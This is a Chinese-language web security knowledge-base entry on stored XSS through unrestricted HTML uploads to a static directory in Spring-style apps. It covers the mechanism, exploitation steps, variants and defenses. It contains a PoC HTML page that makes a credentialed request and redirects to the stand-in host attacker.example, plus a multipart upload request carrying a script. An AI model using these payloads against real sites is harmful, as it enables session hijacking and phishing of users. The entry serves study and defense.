---
id: web-generic-file-upload-html-static-stored-xss
title: 任意后缀上传 HTML 到 Web 静态目录形成同源存储型 XSS
type: scenario
domain: web
path: web/generic/file-upload
technique: arbitrary-upload-html-stored-xss
tags:
- web
- file-upload
- stored-xss
- html
- spring-mvc
- static-resource
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V22
  verified_at: '2026-11-05T02:29:36+08:00'
  notes: 已对照原文与图01-14核对：/student/editStudent 上传无后缀校验，文件随机改名落盘 /upload/imgs，上传 html 重启后可访问并重定向百度，构成同源存储型XSS。原文未涉及组件版本，未设置 affected_versions。未复现 PoC。
url: /docs/web/generic/file-upload/web-generic-file-upload-html-static-stored-xss/
draft: false
kb_aliases:
- HTML 上传 XSS
- 任意文件上传存储型 XSS
- 上传 HTML 打 XSS
- static upload XSS
---

## 一句话结论

上传接口只把文件改名保存、不校验后缀，且上传目录可被 Web 直接访问时，攻击者上传 `.html` 即可得到同源页面，脚本在受害者浏览器中执行，形成存储型 XSS。

## 原理

文件上传的常见校验是“随机化文件名 + 保存到固定目录”，但随机化不等于安全：只要不限制扩展名、且保存目录位于 Web 根或静态资源映射内，文件就会以服务器推断的 MIME 类型返回。`.html` 被浏览器按 `text/html` 解析，其中的 `<script>` 在同源下执行，可读取同源 Cookie（非 HttpOnly）、携带会话发起请求或跳转钓鱼。

Spring MVC/Spring Boot 的静态资源通常在启动时扫描并缓存映射，运行期新写入的文件可能要到重启/刷新后才可访问；这不影响漏洞成立，只是利用时需要等待静态资源重新加载或通过其他路径访问。

## 触发条件

- 上传接口不校验扩展名/类型，或只做前端校验；
- 上传目录位于 Web 可访问路径（如 `/upload/**`、`/static/**`），且未强制 `Content-Disposition: attachment`；
- 响应未设置 `X-Content-Type-Options: nosniff`，或明确以 `text/html` 返回；
- 该路径未被登录拦截器排除/包含策略影响（常被排除，便于图片展示）。

## 利用步骤

1. 找到资料编辑、头像/相册等上传点，抓包确认保存路径与返回的文件名；
2. 上传一个含 JS 的 `.html` 文件，记录随机化后的 URL；
3. 访问该 URL 验证脚本执行；若 404，等待静态资源刷新或重启后再试；
4. 将 URL 发给受害者（或在站内以图片/链接形式诱导打开）；
5. 脚本以受害者身份读取页面数据、发起带 Cookie 的请求或跳转钓鱼页。

## PoC

```html
<!DOCTYPE html>
<html>
<body>
<p>loading...</p>
<script>
  // 同源下可读取非 HttpOnly Cookie 或直接发起操作
  fetch('/student/addStudent', {method: 'POST', credentials: 'include', body: '...'});
  location.href = 'https://attacker.example/';
</script>
</body>
</html>
```

上传请求（multipart，任意后缀）：

```http
POST /student/editStudent HTTP/1.1
Host: target
Cookie: JSESSIONID=...
Content-Type: multipart/form-data; boundary=----x

------x
Content-Disposition: form-data; name="file"; filename="x.html"
Content-Type: text/html

<script>alert(document.domain)</script>
------x--
```

## 变体与关联

- 上传 `.svg`：直接访问时按 `image/svg+xml` 解析，内嵌 `<script>` 同样执行；
- 上传 `.htm`、`.xhtml`、`.shtml` 等浏览器可解析后缀；
- 若上传目录与业务同源且 Cookie 无 HttpOnly，可直接窃取会话；
- 关联：CSRF（用上传的 HTML 作为投递载体）、任意文件上传 getshell（目标容器解析脚本后缀时升级为 RCE）。

## 检测与防御

- 检测：上传目录出现 `.html/.svg/.xhtml` 等非预期类型；访问上传文件返回 `text/html`；同一上传 URL 被大量用户打开；
- 防御：服务端白名单只允许图片类型并校验魔数；图片重新编码；上传目录放独立域名/对象存储，禁止执行与解析 HTML；响应加 `Content-Disposition: attachment`、`X-Content-Type-Options: nosniff`、严格 CSP；
- 会话：Cookie 设置 `HttpOnly`、`Secure`、`SameSite`，降低 XSS 后的会话窃取风险。
